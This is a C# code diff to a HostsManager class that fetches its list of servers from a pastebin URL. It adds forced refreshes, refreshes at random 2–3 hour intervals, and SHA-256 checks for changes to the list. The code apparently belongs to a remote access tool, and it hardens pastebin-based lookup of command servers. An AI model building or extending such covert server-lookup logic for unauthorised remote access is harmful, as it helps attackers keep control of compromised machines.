@@ -3,6 +3,8 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.Cryptography;
+using System.Text;
 
 namespace Pulsar.Common.DNS
 {
@@ -23,6 +25,12 @@ namespace Pulsar.Common.DNS
         private readonly TimeSpan _pastebinCheckInterval = TimeSpan.FromHours(1);
         private bool _pastebinReachable = true;
         private DateTime _lastPastebinFailure = DateTime.MinValue;
+        private readonly TimeSpan _scheduledRefreshWindowMin = TimeSpan.FromHours(2);
+        private readonly TimeSpan _scheduledRefreshWindowMax = TimeSpan.FromHours(3);
+        private readonly Random _refreshRandom = new Random(unchecked(Environment.TickCount * 397 ^ Guid.NewGuid().GetHashCode()));
+        private readonly object _refreshRandomLock = new object();
+        private DateTime _nextScheduledPastebinRefresh = DateTime.MinValue;
+        private string _lastPastebinContentHash;
 
         public HostsManager(List<Host> hosts)
         {
@@ -39,40 +47,56 @@ namespace Pulsar.Common.DNS
             _pastebinFetcher = new PastebinFetcher(pastebinUrl);
             _lastSuccessfulConnection = DateTime.Now;
             
-            RefreshHostsFromPastebin();
+            RefreshHostsFromPastebin(forceRefresh: true);
+            ScheduleNextPastebinRefresh();
         }
 
-        private void RefreshHostsFromPastebin()
+        private bool RefreshHostsFromPastebin(bool forceRefresh = false)
         {
             if (!_isPastebinMode || _pastebinFetcher == null)
-                return;
+                return false;
 
             try
             {
-                string content = _pastebinFetcher.FetchContent();
+                string content = _pastebinFetcher.FetchContent(forceRefresh);
+                _lastPastebinCheck = DateTime.Now;
                 
                 if (string.IsNullOrWhiteSpace(content))
                 {
                     _pastebinReachable = false;
                     _lastPastebinFailure = DateTime.Now;
                     Debug.WriteLine("Failed to get content from pastebin (empty response)");
-                    return;
+                    return false;
                 }
 
-                _hosts.Clear();
-
                 var hosts = _hostsConverter.RawHostsToList(content);
-                foreach (var host in hosts)
-                    _hosts.Enqueue(host);
-                    
+                string newHash = ComputeContentHash(content);
+                bool hasChanged = _lastPastebinContentHash == null || !_lastPastebinContentHash.Equals(newHash, StringComparison.Ordinal);
+
+                if (hasChanged || _hosts.Count == 0)
+                {
+                    _hosts.Clear();
+                    foreach (var host in hosts)
+                        _hosts.Enqueue(host);
+
+                    _lastResolvedHost = null;
+                    _lastPastebinContentHash = newHash;
+                    Debug.WriteLine($"Successfully refreshed {hosts.Count} hosts from pastebin. Connection failure duration: {DateTime.Now - _lastSuccessfulConnection}");
+                }
+                else
+                {
+                    Debug.WriteLine("Pastebin content unchanged; keeping existing hosts.");
+                }
+
                 _pastebinReachable = true;
-                Debug.WriteLine($"Successfully refreshed {hosts.Count} hosts from pastebin. Connection failure duration: {DateTime.Now - _lastSuccessfulConnection}");
+                return hasChanged;
             }
             catch (Exception ex)
             {
                 _pastebinReachable = false;
                 _lastPastebinFailure = DateTime.Now;
                 Debug.WriteLine($"Failed to refresh hosts from pastebin: {ex.Message}");
+                return false;
             }
         }
 
@@ -80,14 +104,27 @@ namespace Pulsar.Common.DNS
         {
             if (_isPastebinMode)
             {
+                if (_nextScheduledPastebinRefresh == DateTime.MinValue)
+                {
+                    ScheduleNextPastebinRefresh();
+                }
+
+                if (DateTime.Now >= _nextScheduledPastebinRefresh)
+                {
+                    Debug.WriteLine("Scheduled pastebin refresh triggered.");
+                    RefreshHostsFromPastebin(forceRefresh: true);
+                    ScheduleNextPastebinRefresh();
+                }
+
                 bool shouldRefreshFromPastebin = false;
-                
+                bool forceRefresh = false;
+
                 if (_hosts.Count == 0 && DateTime.Now - _lastPastebinCheck >= TimeSpan.FromMinutes(1))
                 {
                     Debug.WriteLine("No hosts available, refreshing from pastebin.");
                     shouldRefreshFromPastebin = true;
+                    forceRefresh = true;
                 }
-
                 else if (_hosts.Count > 0 && DateTime.Now - _lastSuccessfulConnection > _connectionFailureThreshold)
                 {
                     Debug.WriteLine($"No successful connection for over {_connectionFailureThreshold.TotalMinutes} minutes, checking pastebin for updates.");
@@ -97,18 +134,17 @@ namespace Pulsar.Common.DNS
                         shouldRefreshFromPastebin = true;
                     }
                 }
-
                 else if (_hosts.Count > 0 && DateTime.Now - _lastSuccessfulConnection <= _connectionFailureThreshold && _pastebinFetcher.ShouldRefresh)
                 {
                     Debug.WriteLine("Frequent refresh from pastebin due to high request count or error.");
                     shouldRefreshFromPastebin = true;
                 }
-                
+
                 if (shouldRefreshFromPastebin)
                 {
                     Debug.WriteLine("Refreshing hosts from pastebin due to conditions met.");
-                    RefreshHostsFromPastebin();
-                    _lastPastebinCheck = DateTime.Now;
+                    RefreshHostsFromPastebin(forceRefresh);
+                    ScheduleNextPastebinRefresh();
                 }
                 
                 if (_hosts.Count == 0)
@@ -165,6 +201,45 @@ namespace Pulsar.Common.DNS
             else
             {
                 return (false, 1800000);
+            }
+        }
+
+        private void ScheduleNextPastebinRefresh()
+        {
+            if (!_isPastebinMode)
+            {
+                _nextScheduledPastebinRefresh = DateTime.MaxValue;
+                return;
+            }
+
+            TimeSpan interval = GetRandomRefreshInterval();
+            _nextScheduledPastebinRefresh = DateTime.Now.Add(interval);
+            Debug.WriteLine($"Next pastebin refresh scheduled in {interval.TotalMinutes:F1} minutes (target {_nextScheduledPastebinRefresh}).");
+        }
+
+        private TimeSpan GetRandomRefreshInterval()
+        {
+            double minMs = _scheduledRefreshWindowMin.TotalMilliseconds;
+            double maxMs = _scheduledRefreshWindowMax.TotalMilliseconds;
+
+            if (maxMs <= minMs)
+            {
+                return TimeSpan.FromMilliseconds(minMs);
+            }
+
+            lock (_refreshRandomLock)
+            {
+                double offset = _refreshRandom.NextDouble() * (maxMs - minMs);
+                return TimeSpan.FromMilliseconds(minMs + offset);
+            }
+        }
+
+        private static string ComputeContentHash(string content)
+        {
+            using (var sha256 = SHA256.Create())
+            {
+                byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(content));
+                return BitConverter.ToString(bytes).Replace("-", string.Empty);
             }
         }
 
